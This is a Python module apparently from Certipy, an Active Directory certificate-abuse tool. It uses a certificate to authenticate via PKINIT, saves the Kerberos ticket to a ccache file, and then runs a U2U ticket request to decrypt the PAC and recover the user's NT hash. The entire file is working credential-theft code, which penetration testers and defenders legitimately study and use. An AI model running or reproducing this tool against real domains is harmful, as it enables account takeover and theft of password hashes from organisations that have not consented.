# Certipy - Active Directory certificate abuse
#
# Description:
#   Use PKINIT to authenticate to KDC with a certificate and retrieve the user's NT hash.
#
# Authors:
#   @ly4k (https://github.com/ly4k)
#
# References:
#   https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/d0cf1763-3541-4008-a75f-a577fa5e8c5b
#   https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py#L292
#   https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py
#

import argparse
import datetime
import logging
from random import getrandbits

from asn1crypto import algos, cms, core, keys, x509

try:
    from Cryptodome.Hash import SHA1
    from Cryptodome.PublicKey import RSA
    from Cryptodome.Signature import PKCS1_v1_5
except ImportError:
    from Crypto.Hash import SHA1
    from Crypto.PublicKey import RSA
    from Crypto.Signature import PKCS1_v1_5

from impacket.dcerpc.v5.rpcrt import TypeSerialization1
from impacket.krb5 import constants
from impacket.krb5.asn1 import (
    AD_IF_RELEVANT,
    AP_REQ,
    AS_REP,
    AS_REQ,
    KERB_PA_PAC_REQUEST,
    TGS_REP,
    TGS_REQ,
    Authenticator,
    EncASRepPart,
    EncTicketPart,
)
from impacket.krb5.asn1 import Ticket as TicketAsn1
from impacket.krb5.asn1 import seq_set, seq_set_iter
from impacket.krb5.ccache import CCache
from impacket.krb5.crypto import Key, _enctype_table
from impacket.krb5.kerberosv5 import KerberosError, sendReceive
from impacket.krb5.pac import (
    NTLM_SUPPLEMENTAL_CREDENTIAL,
    PAC_CREDENTIAL_DATA,
    PAC_CREDENTIAL_INFO,
    PAC_INFO_BUFFER,
    PACTYPE,
)
from impacket.krb5.types import KerberosTime, Principal, Ticket
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from certipy.pkinit import (
    PA_PK_AS_REP,
    PA_PK_AS_REQ,
    AuthPack,
    DirtyDH,
    Enctype,
    KDCDHKeyInfo,
    PKAuthenticator,
    upn_from_certificate,
)
from certipy.target import Target

# https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py#L292
DH_PARAMS = {
    "p": int(
        (
            "00ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea6"
            "3b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e4"
            "85b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b"
            "1fe649286651ece65381ffffffffffffffff"
        ),
        16,
    ),
    "g": 2,
}


def rsa_pkcs1v15_sign(data: bytes, key: RSA.RsaKey) -> bytes:
    return PKCS1_v1_5.new(key).sign(SHA1.new(data))


def sign_authpack(data: bytes, key: RSA.RsaKey, certificate: x509.Certificate) -> bytes:
    digest_algorithm = {}
    digest_algorithm["algorithm"] = algos.DigestAlgorithmId("sha1")

    signer_info = {}
    signer_info["version"] = "v1"
    signer_info["sid"] = cms.IssuerAndSerialNumber(
        {
            "issuer": certificate.issuer,
            "serial_number": certificate.serial_number,
        }
    )

    signer_info["digest_algorithm"] = algos.DigestAlgorithm(digest_algorithm)
    signer_info["signed_attrs"] = [
        cms.CMSAttribute({"type": "content_type", "values": ["1.3.6.1.5.2.3.1"]}),
        cms.CMSAttribute(
            {"type": "message_digest", "values": [SHA1.new(data).digest()]}
        ),
    ]
    signer_info["signature_algorithm"] = algos.SignedDigestAlgorithm(
        {"algorithm": "sha1_rsa"}
    )
    signer_info["signature"] = rsa_pkcs1v15_sign(
        cms.CMSAttributes(signer_info["signed_attrs"]).dump(), key
    )

    enscapsulated_content_info = {}
    enscapsulated_content_info["content_type"] = "1.3.6.1.5.2.3.1"
    enscapsulated_content_info["content"] = data

    signed_data = {}
    signed_data["version"] = "v3"
    signed_data["digest_algorithms"] = [algos.DigestAlgorithm(digest_algorithm)]
    signed_data["encap_content_info"] = cms.EncapsulatedContentInfo(
        enscapsulated_content_info
    )
    signed_data["certificates"] = [certificate]
    signed_data["signer_infos"] = cms.SignerInfos([cms.SignerInfo(signer_info)])

    content_info = {}
    content_info["content_type"] = "1.2.840.113549.1.7.2"
    content_info["content"] = cms.SignedData(signed_data)

    return cms.ContentInfo(content_info).dump()


def truncate_key(value: bytes, keysize: int) -> bytes:
    output = b""
    current_num = 0
    while len(output) < keysize:
        current_digest = SHA1.new(bytes([current_num]) + value).digest()
        if len(output) + len(current_digest) > keysize:
            output += current_digest[: keysize - len(output)]
            break
        output += current_digest
        current_num += 1

    return output


class Authenticate:
    def __init__(self, options: argparse.Namespace, target: Target = None):
        self.options = options
        self.options.no_pass = True

        if target is None:
            self.target = Target(options)
        else:
            self.target = target

        self.nt_password = None

    def run(
        self,
        domain: str = None,
        username: str = None,
        certificate: x509.Certificate = None,
        key: RSA.RsaKey = None,
    ):
        if certificate is None:
            with open(self.options.cert, "rb") as f:
                certificate = x509.Certificate.load(f.read())

        if key is None:
            with open(self.options.key, "rb") as f:
                key = RSA.import_key(f.read())

        if username is None:
            if self.target.username is not None:
                username = self.target.username

        if domain is None:
            if self.target.domain is not None:
                domain = self.target.domain

        if username is None or domain is None:
            upn = upn_from_certificate(certificate)
            components = upn.split("@")

            if domain is None:
                domain = components[-1]
            if username is None:
                username = "@".join(components[:-1])

        if len(username) == 0 or len(domain) == 0:
            logging.error("Username or domain is invalid: %s\\%s" % (domain, username))
            return

        upn = "%s@%s" % (username, domain)
        logging.info("Using UPN %s" % repr(upn))

        diffie = DirtyDH.from_dict(DH_PARAMS)

        # AS_REQ
        as_req = AS_REQ()

        domain = domain.upper()

        server_name = Principal(
            "krbtgt/%s" % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value
        )
        client_name = Principal(
            username, type=constants.PrincipalNameType.NT_PRINCIPAL.value
        )

        pac_request = KERB_PA_PAC_REQUEST()
        pac_request["include-pac"] = True
        encoded_pac_request = encoder.encode(pac_request)

        as_req["pvno"] = 5
        as_req["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)

        req_body = seq_set(as_req, "req-body")

        opts = []
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.proxiable.value)
        req_body["kdc-options"] = constants.encodeFlags(opts)

        seq_set(req_body, "sname", server_name.components_to_asn1)
        seq_set(req_body, "cname", client_name.components_to_asn1)

        req_body["realm"] = domain

        now = datetime.datetime.now(datetime.timezone.utc)
        req_body["till"] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
        req_body["rtime"] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
        req_body["nonce"] = getrandbits(31)

        supported_ciphers = (
            int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
            int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
        )

        seq_set_iter(req_body, "etype", supported_ciphers)

        encoded_req_body = encoder.encode(req_body)

        checksum = SHA1.new(encoded_req_body).digest()

        authpack = AuthPack(
            {
                "pkAuthenticator": PKAuthenticator(
                    {
                        "cusec": now.microsecond,
                        "ctime": now.replace(microsecond=0),
                        "nonce": getrandbits(31),
                        "paChecksum": checksum,
                    }
                ),
                "clientPublicValue": keys.PublicKeyInfo(
                    {
                        "algorithm": keys.PublicKeyAlgorithm(
                            {
                                "algorithm": "1.2.840.10046.2.1",
                                "parameters": keys.DomainParameters(
                                    {"p": diffie.p, "g": diffie.g, "q": 0}
                                ),
                            }
                        ),
                        "public_key": diffie.get_public_key(),
                    }
                ),
                "clientDHNonce": diffie.dh_nonce,
            }
        )

        signed_authpack = sign_authpack(authpack.dump(), key, certificate)

        pa_pk_as_req = PA_PK_AS_REQ()
        pa_pk_as_req["signedAuthPack"] = signed_authpack
        encoded_pa_pk_as_req = pa_pk_as_req.dump()

        as_req["padata"] = noValue

        as_req["padata"][0] = noValue
        as_req["padata"][0]["padata-type"] = int(
            constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value
        )
        as_req["padata"][0]["padata-value"] = encoded_pac_request

        as_req["padata"][1] = noValue
        as_req["padata"][1]["padata-type"] = int(
            constants.PreAuthenticationDataTypes.PA_PK_AS_REQ.value
        )
        as_req["padata"][1]["padata-value"] = encoded_pa_pk_as_req

        logging.info("Trying to get TGT...")
        try:
            tgt = sendReceive(encoder.encode(as_req), domain, self.target.target_ip)
        except KerberosError as e:
            if "KDC_ERR_CLIENT_NAME_MISMATCH" in str(e):
                try:
                    upn = repr(upn_from_certificate(certificate))
                except Exception:
                    upn = ""
                logging.error(
                    (
                        "Name mismatch between certificate and user. Verify that the"
                        " username %s matches the certificate UPN %s"
                    )
                    % (repr(username), upn)
                )
            else:
                logging.error("Got error while request TGT: %s" % str(e))

            return False

        as_rep = decoder.decode(tgt, asn1Spec=AS_REP())[0]

        for pa in as_rep["padata"]:
            if pa["padata-type"] == 17:
                pk_as_rep = PA_PK_AS_REP.load(bytes(pa["padata-value"])).native
                break
        else:
            raise Exception("PA_PK_AS_REP not found")

        ci = cms.ContentInfo.load(pk_as_rep["dhSignedData"]).native
        sd = ci["content"]
        key_info = sd["encap_content_info"]

        if key_info["content_type"] != "1.3.6.1.5.2.3.2":
            raise Exception("Key info content type unexpected value")

        auth_data = KDCDHKeyInfo.load(key_info["content"]).native
        pub_key = int(
            "".join(["1"] + [str(x) for x in auth_data["subjectPublicKey"]]), 2
        )
        pub_key = int.from_bytes(
            core.BitString(auth_data["subjectPublicKey"]).dump()[7:],
            "big",
            signed=False,
        )
        shared_key = diffie.exchange(pub_key)

        server_nonce = pk_as_rep["serverDHNonce"]
        full_key = shared_key + diffie.dh_nonce + server_nonce

        etype = as_rep["enc-part"]["etype"]
        cipher = _enctype_table[etype]
        if etype == Enctype.AES256:
            t_key = truncate_key(full_key, 32)
        elif etype == Enctype.AES128:
            t_key = truncate_key(full_key, 16)
        else:
            raise Exception("Unexpected etype")

        key = Key(cipher.enctype, t_key)
        enc_data = as_rep["enc-part"]["cipher"]
        dec_data = cipher.decrypt(key, 3, enc_data)
        enc_as_rep_part = decoder.decode(dec_data, asn1Spec=EncASRepPart())[0]

        cipher = _enctype_table[int(enc_as_rep_part["key"]["keytype"])]
        session_key = Key(cipher.enctype, bytes(enc_as_rep_part["key"]["keyvalue"]))

        ccache = CCache()
        ccache.fromTGT(tgt, key, None)
        ccache_name = "%s.ccache" % username
        ccache.saveFile(ccache_name)
        logging.info("Saved credential cache to %s" % repr(ccache_name))

        logging.info("Trying to retrieve NT hash for %s" % repr(upn))

        # Try to extract NT hash via U2U
        # https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py
        # AP_REQ
        ap_req = AP_REQ()
        ap_req["pvno"] = 5
        ap_req["msg-type"] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = []
        ap_req["ap-options"] = constants.encodeFlags(opts)

        ticket = Ticket()
        ticket.from_asn1(as_rep["ticket"])

        seq_set(ap_req, "ticket", ticket.to_asn1)

        authenticator = Authenticator()
        authenticator["authenticator-vno"] = 5

        authenticator["crealm"] = bytes(as_rep["crealm"])

        client_name = Principal()
        client_name.from_asn1(as_rep, "crealm", "cname")

        seq_set(authenticator, "cname", client_name.components_to_asn1)

        now = datetime.datetime.utcnow()
        authenticator["cusec"] = now.microsecond
        authenticator["ctime"] = KerberosTime.to_asn1(now)

        encoded_authenticator = encoder.encode(authenticator)

        encrypted_encoded_authenticator = cipher.encrypt(
            session_key, 7, encoded_authenticator, None
        )

        ap_req["authenticator"] = noValue
        ap_req["authenticator"]["etype"] = cipher.enctype
        ap_req["authenticator"]["cipher"] = encrypted_encoded_authenticator

        encoded_ap_req = encoder.encode(ap_req)

        # TGS_REQ
        tgs_req = TGS_REQ()

        tgs_req["pvno"] = 5
        tgs_req["msg-type"] = int(constants.ApplicationTagNumbers.TGS_REQ.value)

        tgs_req["padata"] = noValue
        tgs_req["padata"][0] = noValue
        tgs_req["padata"][0]["padata-type"] = int(
            constants.PreAuthenticationDataTypes.PA_TGS_REQ.value
        )
        tgs_req["padata"][0]["padata-value"] = encoded_ap_req

        req_body = seq_set(tgs_req, "req-body")

        opts = []
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.canonicalize.value)
        opts.append(constants.KDCOptions.enc_tkt_in_skey.value)
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable_ok.value)

        req_body["kdc-options"] = constants.encodeFlags(opts)

        server_name = Principal(
            username, type=constants.PrincipalNameType.NT_UNKNOWN.value
        )

        seq_set(req_body, "sname", server_name.components_to_asn1)

        req_body["realm"] = str(as_rep["crealm"])

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

        req_body["till"] = KerberosTime.to_asn1(now)
        req_body["nonce"] = getrandbits(31)
        seq_set_iter(
            req_body,
            "etype",
            (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)),
        )

        ticket = ticket.to_asn1(TicketAsn1())
        seq_set_iter(req_body, "additional-tickets", (ticket,))
        message = encoder.encode(tgs_req)

        tgs = sendReceive(message, domain, self.target.target_ip)

        tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]

        ciphertext = tgs["ticket"]["enc-part"]["cipher"]

        new_cipher = _enctype_table[int(tgs["ticket"]["enc-part"]["etype"])]

        plaintext = new_cipher.decrypt(session_key, 2, ciphertext)
        special_key = Key(18, t_key)

        data = plaintext
        enc_ticket_part = decoder.decode(data, asn1Spec=EncTicketPart())[0]
        ad_if_relevant = decoder.decode(
            enc_ticket_part["authorization-data"][0]["ad-data"],
            asn1Spec=AD_IF_RELEVANT(),
        )[0]
        pac_type = PACTYPE(ad_if_relevant[0]["ad-data"].asOctets())
        buff = pac_type["Buffers"]

        nt_password = None
        for _ in range(pac_type["cBuffers"]):
            info_buffer = PAC_INFO_BUFFER(buff)
            data = pac_type["Buffers"][info_buffer["Offset"] - 8 :][
                : info_buffer["cbBufferSize"]
            ]
            if info_buffer["ulType"] == 2:
                cred_info = PAC_CREDENTIAL_INFO(data)
                new_cipher = _enctype_table[cred_info["EncryptionType"]]
                out = new_cipher.decrypt(special_key, 16, cred_info["SerializedData"])
                type1 = TypeSerialization1(out)
                new_data = out[len(type1) + 4 :]
                pcc = PAC_CREDENTIAL_DATA(new_data)
                for cred in pcc["Credentials"]:
                    cred_structs = NTLM_SUPPLEMENTAL_CREDENTIAL(
                        b"".join(cred["Credentials"])
                    )
                    nt_password = cred_structs["NtPassword"].hex()
                    break
                break

            buff = buff[len(info_buffer) :]
        else:
            raise Exception("Could not find credentials in PAC")

        self.nt_password = nt_password
        logging.info("Got NT hash for %s: %s" % (repr(upn), nt_password))


def authenticate(options: argparse.Namespace):
    auth = Authenticate(options)
    auth.run()
